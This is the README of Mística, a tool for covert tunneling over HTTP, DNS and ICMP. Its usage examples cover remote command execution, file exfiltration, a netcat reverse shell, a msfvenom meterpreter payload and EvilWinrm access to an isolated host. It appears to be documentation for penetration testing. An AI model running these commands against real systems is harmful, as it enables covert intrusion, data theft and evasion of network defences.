# Mística

Mística is a tool that allows to embed data into application layer protocol fields, with the goal of establishing a bi-directional channel for arbitrary communications.
Currently, encapsulation into HTTP and DNS protocols has been implemented, but more protocols are expected to be introduced in the near future.

Mística has a modular design, built around a custom transport protocol, called SOTP: Simple Overlay Transport Protocol. Data is encrypted, chunked and put into SOTP packets. SOTP packets are encoded and embedded into the desired field of the application protocol, and sent to the other end.

The goal of the SOTP layer is to offer a generic binary transport protocol, with minimal overhead. SOTP packets can be easily hidden or embeddeded into legitimate application protocols. Also SOTP makes sure that packets are received by the other end, encrypts the data using RC4 (this may change in the future), and makes sure that information can flow in both ways transparently, by using a polling mechanism.

Modules interact with the SOTP layer for different purposes:

- Wrap modules or Wrappers: These modules encode / decode SOTP packets from / into application layer protocols
- Overlay modules: These Modules ccommunicate over the SOTP channel. Examples are: io redirection (like netcat), shell (command execution), port forwarding…

Wrapper and overlay modules work together in order to build custom applications, e.g input redirection over DNS or remote port forwarding over HTTP.

Mística’s modular design allows for easy development of new modules.
Also, the user can easily fork current modules in order to use some custom field or encoding or modify the behavior of an overlay module.

There are two main pieces of sofware:

- Mística server (`ms.py`): Uses modules that act as the server of the desired application layer protocol (HTTP, DNS...). It is also designed in a way that will allow for multiple servers, wrappers and overlays to be run at the same time, with just one instance of `ms.py`, although this feature is not fully implemented yet.
- Mística client (`mc.py`): Uses modules that act as the client of the desired applicarion layer protocol (HTTP, DNS...). It can only use one overlay and one wrapper at the same time.

## Demos

You can see some Mística demos in the following [playlist](https://www.youtube.com/playlist?list=PLyUtb47GNF9wqIwI1DGpX_Fr1IXpXHRqB)

## Dependencies

The project has very few dependencies. Currently:

- Mística Client needs at least Python 3.7
- Mística Server needs at least Python 3.7 and `dnslib`.

```
python3.7 -m pip install pip --user
pip3.7 install dnslib --user
```

If you don't want to install python on your system, you can use one of the following portable versions:

- https://www.anaconda.com/distribution/#download-section (for Windows, Linux and macOS)
- https://github.com/winpython/winpython/releases/tag/2.1.20190928 (only for Windows)

## Current modules

Overlay modules:

- `io`: Reads from stdin, sends through SOTP connection. Reads from SOTP connection, prints to stdout
- `shell`: Executes commands recieved through the SOTP connection and returns the output. Compatible with io module.
- `tcpconnect`: Connects to TCP port. Reads from socket, sends through SOTP connection. Reads from SOTP connection, sends through socket.
- `tcplisten`: Binds to TCP port. Reads from socket, sends through SOTP connection. Reads from SOTP connection, sends through socket.

Wrap modules:

- `dns`: Encodes/Decodes data in DNS queries/responses using different methods
- `http`: Encodes/Decodes data in HTTP requests/responses using different methods
- `icmp`: Encodes/Decodes data in ICMP echo requests/responses on data section

## Usage

`ms.py`: Mística Server

Here's how the help message looks like:

```txt
usage: ms.py [-h] [-k KEY] [-l LIST] [-m MODULES] [-w WRAPPER_ARGS]
             [-o OVERLAY_ARGS] [-s WRAP_SERVER_ARGS]

Mistica server. Anything is a tunnel if you're brave enough. Run without
parameters to launch multi-handler mode.

optional arguments:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     RC4 key used to encrypt the comunications
  -l LIST, --list LIST  Lists modules or parameters. Options are: all,
                        overlays, wrappers, <overlay name>, <wrapper name>
  -m MODULES, --modules MODULES
                        Module pair in single-handler mode. format:
                        'overlay:wrapper'
  -w WRAPPER_ARGS, --wrapper-args WRAPPER_ARGS
                        args for the selected overlay module (Single-handler
                        mode)
  -o OVERLAY_ARGS, --overlay-args OVERLAY_ARGS
                        args for the selected wrapper module (Single-handler
                        mode)
  -s WRAP_SERVER_ARGS, --wrap-server-args WRAP_SERVER_ARGS
                        args for the selected wrap server (Single-handler
                        mode)
  -v, --verbose         Level of verbosity in logger (no -v None, -v Low, -vv
                        Medium, -vvv High)

```

There are two main modes in Mística Server:

- **Single Handler Mode**: When `ms.py` is launched with parameters, it allows a single overlay modoule interacting with a single wrapper module.
- **Multi-handler Mode:** (Not published yet) When `ms.py` is run without parameters, the user enters an interactive console, where multiple overlay and wrapper modules may be launched. These modules will be able to interact with each other, with few restrictions.

`mc.py`: Mística client

Here's how the help message looks like:

```txt
usage: mc.py [-h] [-k KEY] [-l LIST] [-m MODULES] [-w WRAPPER_ARGS]
             [-o OVERLAY_ARGS]

Mistica client.

optional arguments:
  -h, --help            show this help message and exit
  -k KEY, --key KEY     RC4 key used to encrypt the comunications
  -l LIST, --list LIST  Lists modules or parameters. Options are: all,
                        overlays, wrappers, <overlay name>, <wrapper name>
  -m MODULES, --modules MODULES
                        Module pair. Format: 'overlay:wrapper'
  -w WRAPPER_ARGS, --wrapper-args WRAPPER_ARGS
                        args for the selected overlay module
  -o OVERLAY_ARGS, --overlay-args OVERLAY_ARGS
                        args for the selected wrapper module
  -v, --verbose         Level of verbosity in logger (no -v None, -v Low, -vv
                        Medium, -vvv High)

```

### Parameters

- `-l, --list` is used to either list `all` modules, only list one type: (`overlays` or `wrappers`) or list the parameters that a certain module can accept through `-o`, `-w` or `-s`.
- `-k, --key` is used to specify the key that will be used to encrypt the overlay communication. This must be the same in client and server and is currently mandatory. This may change in the future if secret-sharing schemes are implemented.
- `-m, --modules` is used to specify which module pair do you want to use. You must use the following format: **overlay_module** + **:** + **wrap_module**. This parameter is also mandatory.
- `-w, --wrapper-args` allows you to specify a particular configuration for the wrap module.
- `-o, --overlay-args` allows you to specify a particular configuration for the overlay module.
- `-s, --wrap-server-args` is only present on `ms.py`. It allows you to specify a particular configuration for the wrap server. Each wrap module has a dependency on a wrap server, and both configurations can be tuned



## Examples and Advanced use

> Remember that you can see all of the accepted parameters of a module by typing `-l <module_name>` (e.g `./ms.py -l dns`). Also remember to use a long and complex key to protect your communications!

### HTTP

In order to illustrate the different methods of HTTP encapsulation, the IO redirection overlay module (`io`) will be used for every example.

- HTTP GET method with b64 encoding in the default URI, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey"`
  - Mística Client:  `./mc.py -m io:http -k "rc4testkey"`
- HTTP GET method with b64 encoding in the default URI, **specifying IP address and port**.
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -s "--hostname x.x.x.x --port 10000"`
  - Mística Client:  `./mc.py -m io:http -k "rc4testkey" -w "--hostname x.x.x.x --port 10000"`
- HTTP GET method with b64 encoding in **custom URI**, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--uri /?token="`
  - Mística Client:  `./mc.py -m io:http -k "rc4testkey" -w "--uri /?token="`
- HTTP GET method with b64 encoding in **custom header**, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--header laravel_session"`
  - Mística Client:  `./mc.py -m io:http -k "rc4testkey" -w "--header laravel_session"`
- HTTP **POST** method with b64 encoding in default field, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--method POST"`
  - Mística Client:  `./mc.py -m io:http -k "rc4testkey" -w "--method POST"`
- HTTP **POST** method with b64 encoding in **custom header**, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--method POST --header Authorization"`
  - Mística Client:  `./mc.py -m io:http -k "rc4testkey" -w "--method POST --header Authorization"`
- HTTP **POST** method with b64 encoding in **custom field**, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--method POST --post-field data"`
  - Mística Client: `./mc.py -m io:http -k "rc4testkey" -w "--method POST --post-field data"`
- HTTP **POST** method with b64 encoding in **custom field, with custom packet size, custom retries, custom timeout and sepcifying IP and port**:
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--method POST --post-field data --max-size 30000 --max-retries 10" -s "--hostname 0.0.0.0 --port 8088 --timeout 30"`
  - Mística Client: `./mc.py -m io:http -k "rc4testkey" -w "--method POST --post-field data --max-size 30000 --max-retries 10 --poll-delay 10 --response-timeout 30 --hostname x.x.x.x --port 8088"`
- HTTP **POST** method with b64 encoding in **custom field**, **using a custom error template**, using localhost and port 8080 (default values).
  - Mística Server: `./ms.py -m io:http -k "rc4testkey" -w "--method POST --post-field data" -s "--error-file /tmp/custom_error_template.html --error-code 408"`
  - Mística Client: `./mc.py -m io:http -k "rc4testkey" -w "--method POST --post-field data"`
- HTTP GET method with b64 encoding in the default URI, using **custom HTTP response code** and using localhost and port 8080 (default values):
  - Mística Server: `./ms.py -m io:http -k test -w "--success-code 302"`
  - Mística Client: `./mc.py -m io:http -k test -w "--success-code 302"`

### DNS

In order to illustrate the different methods of DNS encapsulation, the IO redirection overlay module (`io`) will be used for every example.

- TXT query, using localhost and port 5353 (default values):
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey"`
- NS query, using localhost and port 5353 (default values):
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -w "--queries NS"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--query NS"`
- CNAME query, using localhost and port 5353 (default values):
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -w "--queries CNAME"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--query CNAME"`
- MX query, using localhost and port 5353 (default values):
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -w "--queries MX"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--query MX"`
- SOA query, using localhost and port 5353 (default values):
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -w "--queries SOA"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--query SOA"`
- TXT query, using localhost and port 5353 (default values) and **custom domains**:
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -w "--domains mistica.dev sotp.es"`
  - Mística Client:  
      - `./mc.py -m io:dns -k "rc4testkey" -w "--domain sotp.es"`
      - `./mc.py -m io:dns -k "rc4testkey" -w "--domain mistica.dev"`
- TXT query, specifying port and hostname:
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -s "--hostname 0.0.0.0 --port 1337"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 1337"`
- TXT query, using multiple subdomains:
  - Mística Server: `./ms.py -m io:dns -k "rc4testkey"`
  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--multiple --max-size 169"`

### ICMP

In order to illustrate the different methods of ICMP encapsulation, the IO redirection overlay module (`io`) will be used for every example.

- ICMP Data Section, using interface eth0:
  - Mística Server: `./ms.py -m io:icmp -k "rc4testkey" -s "--iface eth0"`
  - Mística Client:  `./mc.py -m io:icmp -k "rc4testkey" -w "--hostname x.x.x.x"`

### Shell and IO

You can get remote command execution using mística over a custom channel, by combining `io` and `shell` modules. Examples:

- Executing commands on client system over DNS using TXT query.
    - Mística Server: `sudo ./ms.py -m io:dns -k "rc4testkey" -s "--hostname x.x.x.x  --port 53"`
    - Mística Client: `./mc.py -m shell:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53"`

- Executing commands on server system over HTTP using GET requests:
    - Mística Server: `./ms.py -m shell:http -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000"`
    - Mística Client: `./mc.py -m io:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000"`

- Executing commands on client system over ICMP:
    - Mística Server: `./ms.py -m io:icmp -k "rc4testkey" -s "--iface eth0"`
    - Mística Client: `./mc.py -m shell:icmp -k "rc4testkey" -w "--hostname x.x.x.x"`

- Exfiltrating files via HTTP using the IO module and redirect operators:
    - Mística Server: `./ms.py -m io:http -s "--hostname 0.0.0.0 --port 80" -k "rc4testkey" -vv > confidential.pdf`
    - Mística Client (**important to run from the cmd**): `type confidential.pdf | E:\Mistica\WPy64-3741\python-3.7.4.amd64\python.exe .\mc.py -m io:http -w "--hostname x.x.x.x --port 80" -k "rc4testkey" -vv`

### Port forwarding with tcpconnect and tcplisten

- Remote port forwarding (seen from server) over HTTP. Address `127.0.0.1:4444` on the client will be forwarded to address `127.0.0.1:5555` on the server. There must be already something listening on `5555`.
    - Mística Server: `./ms.py -m tcpconnect:http -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000" -o "--address 127.0.0.1 --port 5555"`
    - Mística Client: `./mc.py -m tcplisten:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"`
- Local port forwarding (seen from server) over DNS. Address `127.0.0.1:4444` on the server will be forwarded to address `127.0.0.1:5555` on the client. There must be already something listening on `5555`.
    - Mística Server: `sudo ./ms.py -m tcplisten:dns -k "rc4testkey" -s "--hostname x.x.x.x  --port 53" -o "--address 127.0.0.1 --port 4444"`
    - Mística Client: `./mc.py -m tcpconnect:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 5555"`
- HTTP reverse shell using netcat on linux client.
    - Netcat Listener (on server): `nc -nlvp 5555`
    - Mística Server: `./ms.py -m tcpconnect:http -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000" -o "--address 127.0.0.1 --port 5555"`
    - Mística Client: `./mc.py -m tcplisten:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"`
    - Netcat Shell (on linux client): `ncat -nve /bin/bash 127.0.0.1 4444`
- Running `meterpreter_reverse_tcp` (linux) over DNS using port forwarding. Payload generated with `msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f elf -o meterpreter_reverse_tcp_localhost_4444.bin`
    - Run `msfconsole` on server and launch handler with: `handler -p linux/x64/meterpreter_reverse_tcp -H 127.0.0.1 -P 5555`
    - Mística Server: `sudo ./ms.py -m tcpconnect:dns -k "rc4testkey" -s "--hostname x.x.x.x  --port 53" -o "--address 127.0.0.1 --port 5555"`
    - Mística Client: `./mc.py -m tcplisten:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 4444"`
    - Run meterpreter on client: `./meterpreter_reverse_tcp_localhost_4444.bin`
- [EvilWinrm](https://github.com/Hackplayers/evil-winrm) over ICMP using a jumping machine to access an isolated machine.
    - Mistica Server: `./ms.py -m tcplisten:icmp -s "--iface eth0" -k "rc4testkey" -o "--address 127.0.0.1 --port 5555 --persist" -vv`
    - Mistica Client: `python.exe .\mc.py -m tcpconnect:icmp -w "--hostname x.x.x.x" -k "rc4testkey" -o "--address x.x.x.x --port 5985 --persist" -vv`
    - EvilWinrm Console (on C2 machine): `evil-winrm -u Administrador -i 127.0.0.1 -P 5555`

## Docker

A Docker image has been created for local use. This avoids us having to install Python or dnslib only if we want to test the tool, it is also very interesting for debug or similar because we avoid the noise generated by other local applications. To build it we simply follow these steps:

* First build image with:
```
sudo docker build --tag mistica:latest .
```
* Second, create the network with:
```
sudo docker network create misticanw
```
* Third run the server with (**BEWARE of the volume, change the path to this directory**):
```
sudo docker run --network misticanw --sysctl net.ipv4.icmp_echo_ignore_all=1 -v /home/rcaro/gitlab/Mistica:/opt/Mistica -it mistica /bin/bash
```
* Fourth run the client with (**BEWARE of the volume, change the path to this directory**):
```
sudo docker run --network misticanw -v /home/rcaro/gitlab/Mistica:/opt/Mistica -it mistica /bin/bash
```

## Future work

- Transparent Diffie-Hellman key generation for SOTP protocol
- Payload Generator: Instead of using `./mc.py`, this will allow generating specific and minimalistic standalone binary clients with hardcoded parameters.
- Multi-Handler mode: Interactive mode for `ms.py`. This will let the user combine more than one overlay with more than one wrapper and more than one wrap module per wrap server.
- Module development documentation for custom module development. This is discouraged right now as module specification is still under development.
- Next modules:
    - HTTPS wrapper
    - SMB wrapper
    - RAT and RAT handler overlay
    - SOCKS proxy and dynamic port forwarding overlay
    - File Transfer overlay
- Custom HTTP templates for more complex encapsulation
- SOTP protocol specification documentation for custom clients or servers. This is discouraged right now as the protocol is still under development.

## Authors and license

This project has been developed by Carlos Fernández Sánchez and Raúl Caro Teixidó. The code is released under the GNU General Public License v3.

This project uses third-party open-source code, particularly:

- [Bitstring](https://github.com/scott-griffiths/bitstring) developed by Scott Griffiths.
- [A RC4 binary-safe](https://github.com/DavidBuchanan314/rc4) developed by David Buchanan.
- [A DNS Client without dependencies](https://github.com/vlasebian/simple-dns-client) developed by Vlad Vitan.
- [A ICMP Server and Client without dependencies](https://github.com/rcaroncd/ICMPack/) developed by Raul Caro.